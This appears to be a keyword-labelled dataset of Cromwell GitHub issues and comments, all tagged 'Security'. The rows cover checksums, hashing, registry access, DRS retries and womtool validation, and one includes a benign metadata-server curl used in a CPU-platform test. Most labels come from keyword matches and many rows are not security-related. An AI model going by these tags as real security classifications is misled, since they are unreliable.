Security,"The CWL [File](http://www.commonwl.org/v1.0/CommandLineTool.html#File) type requires a number of additional attributes to pass conformance tests. [Previously](https://travis-ci.org/broadinstitute/cromwell/jobs/298402505) Cromwell was returning:. ```json; {; ""ac159f70-2fcf-469f-a23f-e53b894533b1908791632707518014.output_file"": ""/home/travis/build/broadinstitute/cromwell/cromwell-executions/ac159f70-2fcf-469f-a23f-e53b894533b1908791632707518014/ac159f70-2fcf-469f-a23f-e53b894533b1/call-ac159f70-2fcf-469f-a23f-e53b894533b1908791632707518014/execution/error.txt""; }; ```. When the tests are expecting output like:. ```json; {; ""output_file"": {; ""checksum"": ""sha1$f1d2d2f924e986ac86fdf7b36c94bcdf32beec15"",; ""class"": ""File"",; ""location"": ""error.txt"",; ""size"": 4; }; }; ```. [Currently](https://travis-ci.org/broadinstitute/cromwell/jobs/302086244) there does not seem to be any outputs generated. After discussions, the `WomSingleFile` will be updated to support the new File attributes. TBD: CWL conformance tests must pass, but metadata responses must be backwards compatible for WDL run in Firecloud. Acceptance criteria; - [ ] CWL conformance test # 10 passes; - [ ] Metadata responses for Firecloud are still backwards compatible",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2899:648,checksum,checksum,648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2899,1,['checksum'],['checksum']
Security,"The Config (SFS) backend trait should dynamically fill in the `runtimeAttributeDefinitions` field based on its config. This will allow the JobPreparation to correctly assign the defaults, and allow the call cache hashing to hash the attributes (if appropriate). Depends on #1307",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1315:213,hash,hashing,213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1315,2,['hash'],"['hash', 'hashing']"
Security,"The Cromwell 59 JAR download from GitHub is broken. Also, how does one access the JIRA board? I created an account and tried to access it, but got a permission denied message.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6500:71,access,access,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6500,2,['access'],['access']
Security,"The GCP Batch PR has seen a number of seemingly unrelated failures building the DRS localizer [(Github actions link)](https://github.com/broadinstitute/cromwell/actions/runs/5580938822/jobs/10198518044?pr=7177) and I saw them locally too, both on `develop` and the Batch branch [(Slack link)](https://broadinstitute.slack.com/archives/G01D73CM63S/p1689702982488299?thread_ts=1689702892.491819&cid=G01D73CM63S). ```; W: GPG error: http://security.ubuntu.com/ubuntu jammy-security InRelease: At least one invalid signature was encountered.; E: The repository 'http://security.ubuntu.com/ubuntu jammy-security InRelease' is not signed. process ""/bin/sh -c apt-get -y update"" did not complete successfully; ```. It seems that specifying the OS explicitly instead of implicitly helps work around the problem. I confirmed that yesterday's build of the localizer uses the same base so this is not a radical change. [Nightly:](https://hub.docker.com/layers/broadinstitute/cromwell-drs-localizer/86-af9660e/images/sha256-ee39681ef7287e904fdde01874b5dfa80b045aed28b9cc4b017554bdb40015f1?context=repo); ```; docker inspect broadinstitute/cromwell-drs-localizer:86-af9660e; ""Labels"": {; ""org.opencontainers.image.ref.name"": ""ubuntu"",; ""org.opencontainers.image.version"": ""22.04""; }; ```; Local:; ```; docker inspect broadinstitute/cromwell-drs-localizer:86-813fc98-SNAP; ""Labels"": {; ""org.opencontainers.image.ref.name"": ""ubuntu"",; ""org.opencontainers.image.version"": ""22.04""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7179:437,secur,security,437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7179,4,['secur'],['security']
Security,"The HTTP library we use [0] does not support proxies [1], therefore it is not possible for Cromwell to support them either without a whole-library replacement. The certificate error is normal and a red herring, it occurs because certs apply to domain names and not IP addresses. I can reproduce it locally with no proxy. [0] https://github.com/broadinstitute/cromwell/blob/17efd599d541a096dc5704991daeaefdd794fefd/project/Dependencies.scala#L166; [1] https://github.com/http4s/blaze/issues/656",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814:164,certificate,certificate,164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136#issuecomment-1544540814,1,['certificate'],['certificate']
Security,"The Nirvana reference image I made about a month ago had all the right files on it, but due to some last minute updates the paths where they were located on the image were not consistent with the firecloud-develop manifest. The Centaur test did not catch this because it only checked that reference image usage had been activated and that inputs were symlinks as opposed to regular files; unfortunately the test did not check that the symlinks pointed to files that actually existed. . These changes harden the Centaur reference image test to validate the symlinks and update the manifest to point to a corrected Nirvana image I made today. I confirmed locally that this test fails on the 2023-01-03 Nirvana image and succeeds on the 2023-02-01 Nirvana image. Associated firecloud-develop [PR](https://github.com/broadinstitute/firecloud-develop/pull/3232/files)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6996:543,validat,validate,543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6996,1,['validat'],['validate']
Security,"The PAPI v2 reference disk feature validates crc32c values for every file listed in configured reference disk manifests (CI manifest [here](https://github.com/broadinstitute/cromwell/blob/77c369596a1ad1153aff3fd4c8753d8a28dd649c/src/ci/resources/papi_v2_reference_image_manifest.conf)). If a file's crc32c value in GCS does not match its crc32c value in the manifest, the file will be omitted from Cromwell's reference mapping. In this particular case`gs://gcp-public-data--broad-references/hg19/v0/README` was updated in GCS which changed its GCS crc32c, but the manifest was not similarly updated until now. Cromwell did [emit a warning for this](https://api.travis-ci.com/v3/job/543857965/log.txt#:~:text=09%3A31%2C195%20%20WARN%20%20--,The%20following%20files%20listed%20in%20references%20manifest%20have%20checksum%20mismatch%20with%20actual%20files%20in%20GCS%3A%20ReferenceFile(gcp-public-data--broad-references/hg19/v0/README%2C1479759245,-)%0A2021-10-18) but I didn't notice it until after I started debugging. As there are 1604 files in the current CI manifest and it appears the only file that has changed in 8 months is the one file we use for CI, it seems likely we didn't make the best choice of test data. Suggestion for a better alternative are welcome. 🙂",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6546:35,validat,validates,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6546,1,['validat'],['validates']
Security,"The WDL is part of an entire pipeline, that I can't post here. But I can share this:; [WDLTesting.zip](https://github.com/broadinstitute/cromwell/files/6827255/WDLTesting.zip). ```; $ $CROMWELL_HOME/womtool validate WDLTesting/src/wdl/Workflow.wdl ; Failed to import 'WDLTesting/src/wdl/WriteTask.wdl' (reason 1 of 1): ERROR: Unexpected symbol (line 11, col 2) when parsing 'setter'. Expected equal, got ""String"". 	String	input2 = ""Default""; ^. $setter = :equal $e -> $1; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722:207,validat,validate,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881118722,1,['validat'],['validate']
Security,"The `CwlV1_0LanguageFactory` can `validateNamespace` (used in `MaterializeWorkflowDescriptorActor`) but lacks any concept of `WomBundle`, the output of `getWomBundle` and the input to `createExecutable`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-425466052:34,validat,validateNamespace,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-425466052,1,['validat'],['validateNamespace']
Security,"The `DrsCloudNioFileSystemProvider` was wrapping the retries of the `DrsPathResolver` with another set of `CloudNioRetry` retries. The product of these two retries at the previous configuration values would wait around 35 minutes (~:20 + 10 x ~3:30) to fail for each doomed attempt. That combined with a fairly wide scatter and a typo'd DRS path for `file` in code like . ```; task size {; input {; File file; }. Int file_size = ceil(size(file)); ...; }; ```; would completely block all 10 of the `IoActor`s [NIO threads](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/server/CromwellRootActor.scala#L108). These changes remove the nested retries in the engine and dial back the patience for retries. If we want the retries to be more patient we'll probably have to make other code that is competing for `IoActor` threads more patient as well. Utility files for reproducing this error can be cherry picked from commit `ff7bddc8830802f7a606177d0eaf19c8f47ca865`. I don't know how to programatically link Google accounts to NIH accounts in Bond to be able to include this Centaur test in CI, though maybe we don't need to be linked to make sure this negative case errors within a reasonable timeout?. Workflow`9635fbf0-00b1-4635-b482-5a782cda5cd5` induced this problem in production, its metadata shows multiple `HaplotypeCaller` shards erroring out with ; ```; Failed to evaluate input 'disk_size' (reason 1 of 1): [Attempted 1 time(s)] - RuntimeException: Unexpected response during DRS resolution: RuntimeException: Could not access object 'drs://dg4.DFC/...'. Status: 500, reason: 'Internal Server Error', Martha location: 'https://.../martha_v3', message: 'Received error while resolving DRS URL. getaddrinfo ENOTFOUND dg4.dfc'; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6439:1567,access,access,1567,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6439,1,['access'],['access']
Security,"The `SprayDockerRegistryApiClientSpec` check for the v1 docker repositories on the hub.docker.com registry are all returning 404. Tried switching the repository searched on the registry from [`ubuntu`](https://hub.docker.com/r/_/ubuntu/) to [`registry`](https://hub.docker.com/r/_/registry/), but that only worked for a day or two. Either the handshake for accessing the v1 hub.docker.com needs to be updated, or perhaps the test needs an edit / removal. Perhaps we may also decide to only support v2 registries. `sbt engine/alltests:test-only *SprayDockerRegistryApiClient` will run the tests including ""resolve docker hub image v1 layer ids"", that may be marked with ""ignore"" by the time this ticket is addressed. Haven't checked GCR (or artifactory, quay, etc.) recently, but perhaps most registries are all using v2 for looking up repositories and we may remove v1 support. NOTE: Docker Hub, even though it is technically a _docker registry_, did NOT implement the official Docker Registry API for a long time.; - http://dev.hpcloud.com/blog/2016/wrangling-different-docker-apis . See also:; - https://docs.docker.com/registry/spec/api/; - https://github.com/docker/distribution; - https://docs.docker.com/v1.7/docker/reference/api/docker-io_api/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1251:357,access,accessing,357,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1251,1,['access'],['accessing']
Security,"The `graph` action in womtool works fine, but when adding the `--all` argument, it gives the error:; ```; java -jar womtool-44.jar --all graph host_workflow.wdl ; Error: Unknown option --all; ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5126:1079,PASSWORD,PASSWORDS,1079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5126,1,['PASSWORD'],['PASSWORDS']
Security,"The `validateWomNamespace` method was using `NoIoFunctionSet` instead of the available ioFunctions, causing the workflow in the centaur test to fail",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3715:5,validat,validateWomNamespace,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3715,1,['validat'],['validateWomNamespace']
Security,"The attached wdl and json file have an issue with the second call in the pipeline. It is scattered over the bam files output by the first call (RevertSam). The problem is that shard-5 grabs the wrong bam file to input into the second call (FirstSortSam). All of the other shards grab the correct file except for shard-5 which grabs the bam file that is the input to the RevertSam task (rather than its output). The workaround to fix this was to change the glob command to be more specific: if I change it from *.bam to *.unmapped.bam, then shard-5 is correct. [BrokenShard.wdl.txt](https://github.com/broadinstitute/cromwell/files/432898/BrokenShard.wdl.txt); [testBam.json.txt](https://github.com/broadinstitute/cromwell/files/432900/testBam.json.txt). Note the example files that are attached need access to the Broad file system to run.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1321:800,access,access,800,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1321,1,['access'],['access']
Security,The batched heartbeat writer and workflow picker upper both try to lock multiple rows in the workflow store table inside a transaction and were often observed to deadlock. These two workflow store accesses are now routed through an actor that effectively serializes access to the workflow store table (other accesses are not affected). If this manages to run the gauntlet of gulls [batch abort](https://github.com/broadinstitute/cromwell/issues/3753) would likely need to be added to this system. Known shortcomings:; - ~~Should probably give more thought as to the thread on which the blocking happens.~~ now on the IO dispatcher; - ~~Should consider actor supervision because if this one actor ever dies that will be bad times.~~ default Akka supervision is reasonable here; - ~~May keep one writer Cromwell from tripping over itself but wouldn't keep multiple writer Cromwells from tripping over each other~~ ticketed in #3795,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3761:197,access,accesses,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3761,3,['access'],"['access', 'accesses']"
Security,The case I inspected has error in only one of the 17 shards (of the same scatter). For example:. ```bash; $ for i in $(ls shard-*/*.log); do echo $i; grep Requester $i; done; BaseRecalibrator-0.log; BaseRecalibrator-10.log; BaseRecalibrator-11.log; BaseRecalibrator-12.log; BaseRecalibrator-13.log; BaseRecalibrator-14.log; BaseRecalibrator-15.log; BaseRecalibrator-16.log; BaseRecalibrator-1.log; BaseRecalibrator-2.log; BaseRecalibrator-3.log; BaseRecalibrator-4.log; BaseRecalibrator-5.log; BaseRecalibrator-6.log; BaseRecalibrator-7.log; BaseRecalibrator-8.log; BaseRecalibrator-9.log; ServiceException: 401 Requester pays bucket access requires authentication.; ServiceException: 401 Requester pays bucket access requires authentication.; ServiceException: 401 Requester pays bucket access requires authentication.; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-436261622:634,access,access,634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-436261622,6,"['access', 'authenticat']","['access', 'authentication']"
Security,"The code used for localizing and executing the Cromwell exec script is embedded within tar.gz file in the cromwell code base. Today, each user of cromwell must locate the worker.tar.gz from cromwell's source code repository and provide a location of the file as a runtime attribute. If the path provided in the runtime attributes is a local path then cromwell streams the bytes to the OSS `Command.packagePath`. Instead of requiring the user to access cromwell's source code cromwell should move the file into an embedded resource under the directory `src/main/resources/`. The likely package location based on the other classes is `supportedBackends/bcs/src/main/scala/cromwell/backend/impl/bcs/`. Then using `better.files.File(java.lang.Object.getClass.getResource(""worker.tar.gz"").getPath)` the bytes can still be streamed to OSS. - https://github.com/aliyun/aliyun-openapi-java-sdk/blob/77e3f7639db351ced87d13b9a62f5566645f107c/aliyun-java-sdk-batchcompute/src/main/java/com/aliyuncs/batchcompute/pojo/v20151111/Command.java#L44-L47; - https://github.com/broadinstitute/cromwell/blob/31/supportedBackends/bcs/src/main/scala/cromwell/backend/impl/bcs/BcsAsyncBackendJobExecutionActor.scala#L245-L255; - https://github.com/broadinstitute/cromwell/blob/31/supportedBackends/bcs/src/main/scala/cromwell/backend/impl/bcs/worker.tar.gz. A/C:; - A user no longer needs to specify the path to the `worker.tar.gz` as it is an embedded resource; - Remove the `worker.tar.gz` reference from the `bcs_centaur.conf.ctmpl`; - Update cromwell docs on BCS so that specifying the worker path is not mandatory; - (Optional) Allow a configuration value / runtime attribute to still override the worker path for debugging purposes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3520:445,access,access,445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3520,1,['access'],['access']
Security,"The comment in the keel PR asserts that the hashes returned in `Docker-Content-Digest` and within the body are the same, but in my limited testing on Docker Hub, Quay and GCR that did not seem to be the case. If the body value actually represents something other than the image digest it may cause downstream issues for Cromwell to treat as such. . Basically this issue needs more investigation. Since ECR support is apparently not as a high a priority as originally thought this issue has been deprioritized for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487639234:44,hash,hashes,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487639234,1,['hash'],['hashes']
Security,"The current [AWS 101 docs](https://github.com/broadinstitute/cromwell/blob/aws_backend/docs/tutorials/AwsBatch101.md) lists an optional section for specifying a private Docker registry. . ```; // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; ```. This should be taken out, since it is handled at the level of a custom AMI for AWS Batch and is not something that you can specify at runtime or within Cromwell.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3574:243,access,access,243,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3574,1,['access'],['access']
Security,"The default user agent `OpenAPI-Generator/30/java` is [not valid](https://stackoverflow.com/a/2601492/818054) and causes Akka to issue warnings. Updated to be compliant and actually tells us its identity and version. Tested by running `./scripts/gen_java_client.sh` and locating the following in the resulting `ApiClient.java`:; ```; private void init() {; verifyingSsl = true;. json = new JSON();. // Set default User-Agent.; setUserAgent(""Cromwell-Java-Client/f9ef79a"");. authentications = new HashMap<String, Authentication>();; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7087:474,authenticat,authentications,474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7087,3,"['Authenticat', 'Hash', 'authenticat']","['Authentication', 'HashMap', 'authentications']"
Security,"The document that contains the cross-site AJAX calls would need to be; served with the Access-Control-Allow-Origin * HTTP header. Does Cromwell; ever serve documents that contain AJAX calls?. On Wed, Nov 8, 2017 at 10:06 AM, Chris Llanwarne <notifications@github.com>; wrote:. >; > - I don't think Cromwell had any opinions on where it gets called from; > (it's all stateless REST queries over HTTP) - could you give an example of; > what you're trying to do?; > - I've only ever seen Access-Control-Allow-Origin in reference to web; > browser behavior; > - Maybe you have something in front of Cromwell that's blocking you?; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342845454>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AG_4aDbsUjYVfFiIoOCTyoVz92Oc3UUvks5s0cOFgaJpZM4QRuA->; > .; >. -- ; Oliver Ruebenacker; Senior Software Engineer, Diabetes Portal; <http://www.type2diabetesgenetics.org/>, Broad Institute; <http://www.broadinstitute.org/>",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342872932:87,Access,Access-Control-Allow-Origin,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342872932,2,['Access'],['Access-Control-Allow-Origin']
Security,"The documentation has a nice section on [how to use Service Accounts with Cromwell](https://cromwell.readthedocs.io/en/develop/backends/Google/), with the Google Cloud backend. However, what it doesn't do is explain the roles/permissions that such an account needs. It would be appreciated if we had a list of permissions we could apply to our Service Accounts to know that we had the absolute minimum required for Cromwell to control jobs (probably separate lists for filesystem access and job management). Currently, the roles I've applied to my Service Account are:. * Compute Instance Admin (v1); * Genomics Pipelines Runner; * Service Account User; * Storage Object Admin. This works, but I know that these roles are quite permissive. Ideally I'd be able to lock it down to permissions that stop it from deleting buckets etc.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304:480,access,access,480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304,1,['access'],['access']
Security,"The engine doesn't want to see this. The engine shouldn't see this. Dont'send back a hash code!. If this breaks legacy code, comment out until it compiles again!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/907:85,hash,hash,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/907,1,['hash'],['hash']
Security,"The error messages from Cromwell when it can't find input files are opaque:. Response body:; {; ""status"": ""error"",; ""message"": ""404 Not Found\n{\n \""code\"" : 404,\n \""errors\"" : [ {\n \""domain\"" : \""global\"",\n \""message\"" : \""Not Found\"",\n \""reason\"" : \""notFound\""\n } ],\n \""message\"" : \""Not Found\""\n}""; } . Response header:; {; ""Date"": ""Fri, 18 Nov 2016 21:15:39 GMT"",; ""Server"": ""spray-can/1.3.2"",; ""X-Frame-Options"": ""SAMEORIGIN"",; ""Access-Control-Max-Age"": ""1728000"",; ""Access-Control-Allow-Methods"": ""GET,POST,PUT,PATCH,DELETE,OPTIONS,HEAD"",; ""Content-Type"": ""application/json; charset=UTF-8"",; ""Access-Control-Allow-Origin"": ""*"",; ""Access-Control-Expose-Headers"": ""Link"",; ""Connection"": ""close"",; ""Access-Control-Allow-Headers"": ""authorization,content-type,accept,origin"",; ""Content-Length"": ""232""; } ```. Response Code: 500. It would be very helpful if it could specify what files are missing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1691:442,Access,Access-Control-Max-Age,442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1691,6,"['Access', 'authoriz']","['Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin', 'Access-Control-Expose-Headers', 'Access-Control-Max-Age', 'authorization']"
Security,"The essence of this issue is that:. ...I have a workflow that calls sub workflows; ...My Workflow validates and everything is swell; ...I want to now run this against a Cromwell server, and turns out I need a zip. ; ...I make a dependencies zip, but see that Cromwell doesn't seem to like it!. AC: Have there be an option in Womtool that packages the files referenced in my import statements as a valid dependencies zip to help reduce issues at runtime.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3501:98,validat,validates,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3501,1,['validat'],['validates']
Security,The extracted `WdlValueSimpleton` file was thieved from @cjllanwarne's magnum opus hashing branch and some metacharacter handling added to it.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1305:83,hash,hashing,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1305,1,['hash'],['hashing']
Security,"The first run of JG failed because an actor context happened to be null.; Specifically this happened when we use the actor system dispatcher as an Execution Context for the execution of futures in the Actor.; I only saw this once and the reason is unclear. Akka claims actor contexts can't be null.; One possible explanation (maybe?) is that the actor schedules some futures, then die for an unknown reason. By the time the futures become runnable and try to access their EC, the actor is already dead so the creation of the EC from the `context.dispatcher` fails. <img width=""1411"" alt=""screen shot 2017-04-10 at 5 07 02 pm"" src=""https://cloud.githubusercontent.com/assets/2978948/25280517/3f8fc75a-2678-11e7-966a-54340199c1e0.png"">",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2189:459,access,access,459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2189,1,['access'],['access']
Security,"The folloring WDL:; ```; version 1.0. workflow main {; Int a = 1; Array[Int] b = [1, 2]; output { Array[Int] c = [a, b] }; }; ```; Will validate fine:; ```; $ java -jar womtool-83.jar validate main.wdl; Success!; ```; But it will fail to run:; ```; $ java -jar cromwell-83.jar run main.wdl; java.lang.RuntimeException: Failed to evaluate 'main.c' (reason 1 of 1): Evaluating [a, b] failed: No coercion defined from wom value(s) '[1, 2]' of type 'Array[Int]' to 'Int'.; ```; This is not really important, but I was wondering what the reason for using different code to check the syntax in womtool and when running a WDL with Cromwell could be",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6834:136,validat,validate,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6834,2,['validat'],['validate']
Security,"The following WDL fails to parse because of the expressions in the array accesses. ```; workflow foo {; Array[String] inputs = [ ""A0"", ""A1"", ""B0"", ""B1"", ""C0"", ""C1"" ]. scatter(i in range(length(inputs) / 2)) {; String item0 = inputs[i * 2]; String item1 = inputs[i * 2 + 1]; call bar { input: item0 = item0, item1 = item1 }; }; }. task bar {; String item0; String item1; command { echo ""<< item0: ${item0}, item1: ${item1} >>"" }; output {; String combined = read_string(stdout()); }; }; ```. The error given is:; ```; cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Unable to load namespace from workflow: ERROR: Unexpected symbol (line 5, col 29) when parsing 'e'. Expected rsquare, got *. String item0 = inputs[i * 2]; ^. $e = :identifier <=> :lparen $_gen18 :rparen -> FunctionCall( name=$0, params=$2 ). ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2599:73,access,accesses,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2599,1,['access'],['accesses']
Security,"The following WDL:; ```; version 1.0. workflow main {; input {; String X; }; output {; String Y = select_first([X]); Array[String] Z = select_all([X]); }; }; ```. Used to fail to validate:; ```; $ java -jar womtool-52.jar validate main.wdl; Failed to process workflow definition 'master' (reason 1 of 1): Failed to process declaration 'Array[String] Z = select_all([X])' (reason 1 of 1): Failed to process expression 'select_all([X])' (reason 1 of 1): Invalid parameter 'ArrayLiteral(Vector(IdentifierLookup(X)))'. Expected an array of optional values (eg 'Array[X?]') but got 'Array[String]+'; ```. But after updating to version 53 or newer:; ```; $ java -jar womtool-53.1.jar validate main.wdl; Success!; ```. It is not a big change, but I wonder why the modification. The old behavior seemed more helpful to me.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6212:179,validat,validate,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6212,3,['validat'],['validate']
Security,"The following could be used as the command body of a Centaur WDL to test this feature (copy-paste-edited from Thibault's [`docker_size_gcr.wdl`](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/docker_size/docker_size_gcr.wdl)):; ```; apt-get install --assume-yes jq > /dev/null; NAME=`curl -s -H ""Metadata-Flavor: Google"" http://metadata.google.internal/computeMetadata/v1/instance/name`; ZONE=`basename \`curl -s -H ""Metadata-Flavor: Google"" http://metadata.google.internal/computeMetadata/v1/instance/zone\``; PROJECT=`curl -s -H ""Metadata-Flavor: Google"" http://metadata.google.internal/computeMetadata/v1/project/project-id`; curl -s -H ""Authorization: Bearer `gcloud auth print-access-token`"" ""https://www.googleapis.com/compute/v1/projects/$PROJECT/zones/$ZONE/instances/$NAME?fields=cpuPlatform"" | jq -r '.cpuPlatform'; ```; Run on one of Jeff's legion GCE VMs this produces. ```; Intel Haswell; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460339656:695,Authoriz,Authorization,695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460339656,2,"['Authoriz', 'access']","['Authorization', 'access-token']"
Security,"The following wdl has the wrong variable name in the output section of the task:. ```; workflow GenotypeGVCFsComparison {; File combined_gvcf_input = ""gs://dsde-palantir/SnapshotExperiment2015/CEUTrio/gvcfs/NA12878.d691bf66-37af-4375-9c09-6a6607f322e8.g.vcf.gz"". call IndexVCF{; input:; combined_gvcf = combined_gvcf_input,; disk_size = 200; }; }. task IndexVCF {; File combined_gvcf; Int disk_size. command {; /usr/gitc/tabix ${combined_gvcf}; }; runtime {; docker: ""broadinstitute/genomes-in-the-cloud@sha256:d7aa37fc8351074a2d6fb949932d3283cdcefdc8e53729dcf7202bee16ab660a""; memory: ""13 GB""; cpu: ""1""; disks: ""local-disk "" + disk_size + "" HDD""; }; output {; File gvcf = ""${gvcf}""; File gvcf_index = ""${gvcf}.tbi""; }; }; ```. In Version 24 of Cromwell this WDL breaks the whole cromwell server. In Version 25 the only the workflow breaks which is a big improvement, however it runs the task to completion before breaking. It would be nice to validate the WDL before running the task to make sure the variables are named correctly.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226:944,validat,validate,944,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226,1,['validat'],['validate']
